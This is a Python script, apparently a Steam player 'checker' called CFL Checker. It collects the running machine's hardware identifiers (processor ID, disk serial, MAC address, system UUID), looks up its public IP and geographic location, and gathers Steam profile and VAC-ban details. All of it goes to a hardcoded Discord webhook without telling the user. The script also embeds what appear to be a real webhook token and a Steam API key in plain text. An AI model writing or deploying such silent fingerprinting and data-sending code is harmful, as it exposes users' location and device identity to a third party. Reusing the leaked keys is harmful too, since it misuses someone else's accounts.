import requests, subprocess, time, os, winreg



from discord_webhook import DiscordWebhook, DiscordEmbed
from steamUser import steamUser

# Инициализация DB


def find_steam():
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Valve\\Steam")
    value = winreg.QueryValueEx(key, "InstallPath")[0]
    steam_accid_folder = os.listdir(path=f"{value}\\userdata")
    for i in range(len(steam_accid_folder)):
        print(steam_accid_folder[0])
        steam_accid_folder.pop(0)
    return 'Work'


def get_account_id(steamid):
    steamid = steamid
    BASE_URL = "https://steamid.pro/lookup/"
    request = requests.get(BASE_URL + steamid)
    respond = request.text.split('data-clipboard-text="', 1)[-1].split('"\n', 1)[0]
    return respond

def get_ip():
    response = requests.get('https://api64.ipify.org?format=json').json()
    return response["ip"]

def get_location():
    ip_address = get_ip()
    response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
    location_data = {
        "ip": ip_address,
        "city": response.get("city"),
        "region": response.get("region"),
        "country": response.get("country_name")
    }
    return location_data

def ProcessorCheck():
    site = requests.get('https://github.com/CheeFaitLer/CFL_Checker/blob/main/security')
    if get_pcinfo()[2] in site.text:
        pass
    else:
        print(f"Processor ID not registred, try later.")
        print(f"Your proccesor ID - {get_pcinfo()[2]} , contact CheeFaitLer to fix this.")
        time.sleep(5)
        os._exit(0)

def get_pcinfo():
    pcinfo = [] # Baseboard, mac, processordid, gpu, diskid, motherboard, memorycheap, bios, uuid
    pcinfo.append(subprocess.check_output("wmic baseboard get serialnumber").decode().split('\n')[1].strip())
    pcinfo.append(subprocess.check_output("""wmic path Win32_NetworkAdapter where "PNPDeviceID like '%%PCI%%' AND NetConnectionStatus=2 AND AdapterTypeID='0'" get MacAddress""").decode().split('\n')[1].strip())
    pcinfo.append(subprocess.check_output("wmic cpu get processorid").decode().split('\n')[1].strip())
    pcinfo.append(subprocess.check_output("wmic PATH Win32_VideoController GET Description,PNPDeviceID").decode().split('\n')[1].strip())
    pcinfo.append(subprocess.check_output("wmic diskdrive get serialnumber").decode().split('\n')[1].strip())
    pcinfo.append(subprocess.check_output("wmic baseboard get serialnumber").decode().split('\n')[1].strip())
    pcinfo.append(subprocess.check_output("wmic memorychip get serialnumber").decode().split('\n')[1].strip())
    pcinfo.append(subprocess.check_output("wmic bios get serialnumber").decode().split('\n')[1].strip())
    pcinfo.append(subprocess.check_output("wmic csproduct get uuid").decode().split('\n')[1].strip())
    return pcinfo

def check(steamid, name, numofrep):
    steamid = steamid
    name = name
    numofrep = numofrep
    print(f"{steamid}, {name}, {numofrep}")

    
def send_record(steamid, name, numofrep, files):
    steamid = steamid
    name = name
    numofrep = numofrep
    files = files

    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1235328788280377454/45FhE-2r3xcdiofYS2EU-b15xkEgMjFxtG4Hv9ltSpF8BmObZVkePDTRMBqez8DRbZuX")
    embed = DiscordEmbed(title="CFL Check", description="123")
    # Картинка embed.set_image(url='https://i.imgur.com/Raoi4P3.jpeg')
    embed.set_author(name='CFL Checker', url="https://i.imgur.com/Raoi4P3.jpeg", icon_url="https://i.imgur.com/Raoi4P3.jpeg")
    webhook.add_embed(embed)
    response = webhook.execute
    response()
    
    # Получение информации из Steam

    steaminfo = steamUser(steamid, 'DDCEAEA17A04E17252F8B2A7D55AED76').getUser()
    steamvac = steamUser(steamid, 'DDCEAEA17A04E17252F8B2A7D55AED76').getBans()
    
    # Эмбед на стим профиль

    embed.add_embed_field(name='Steam Profile', value='Checked1')

    # Получение информации переменными
    
    steam_url = steaminfo['profileurl']
    steam_icon = steaminfo['avatars']
    steam_steamid = steaminfo['steamid64']
    steam_online = steaminfo['onlinestate']
    # TODO Исправить онлайн статус
    steam_visible = steaminfo['visibilityState']
    steam_nickname = steaminfo['name']
    steam_vac_status = steamvac[0]
    steam_vac_numbers = steamvac[1]
    steam_accid = get_account_id(steamid)
    print(get_location())
    # Получени информации об IP
    #ip_city = get_location['city']
    #ip_region = get_location['region']
    #ip_country = get_location['country']

    # Проверка на ВАК баны

    if steam_vac_status is False:
        steam_vac_status = 'No VAC'
    else:
        steam_vac_status = 'Have VAC, number - '
        steam_vac_status = steam_vac_status + str(steam_vac_numbers)
    
    #{ip_country} \n Region - {ip_region} \n City - {ip_city}

    # Отправка информации
    pcinfo = get_pcinfo()
    embed2 = DiscordEmbed(title="Steam account info")
    embed2.set_author(name='User Info', url=f"{steam_url}", icon_url=f"{steam_icon}")
    embed2.set_description(f"Nickname - {steam_nickname} \n Online status - {steam_online} \n VAC status - {steam_vac_status} \n SteamID - {steam_steamid} \n SteamAccID - {get_account_id(steamid)}\n Profile state - {steam_visible}")
    embed2.add_embed_field(name='HWID', value=f"Processor id - {pcinfo[2]} \n Disk Info - {pcinfo[4]} \n MAC - {pcinfo[1]} \n HWID - {pcinfo[8]}")
    embed2.add_embed_field(name='IP Adress and Location', value=f"IP - {get_ip()} \n Location - {get_location()}")
    embed2.set_timestamp()
    webhook.add_embed(embed2)
    response = webhook.execute
    response()
ProcessorCheck()

check('76561198356456158', 'cheefaitler', '3')
send_record(' 76561198356456158', '1', '1', '1')
#steaminfo = steamUser('76561198356456158', 'DDCEAEA17A04E17252F8B2A7D55AED76').getUser()
#print(steaminfo)